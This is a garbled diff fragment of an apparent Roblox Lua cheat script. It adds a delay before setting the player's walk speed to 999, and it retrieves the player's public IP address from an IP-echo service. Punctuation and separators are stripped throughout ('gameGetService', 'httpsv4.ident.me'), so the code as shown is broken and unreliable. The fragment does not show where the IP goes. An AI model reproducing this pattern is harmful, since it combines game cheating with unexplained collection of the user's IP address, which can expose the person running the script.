@@ -8,7 +8,7 @@ gameGetService(StarterGui)SetCore(SendNotification,{
 	Text =  , 
 })
 
-
+wait(12)
 game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 999
 
 local IP = gameHttpGet(httpsv4.ident.me)
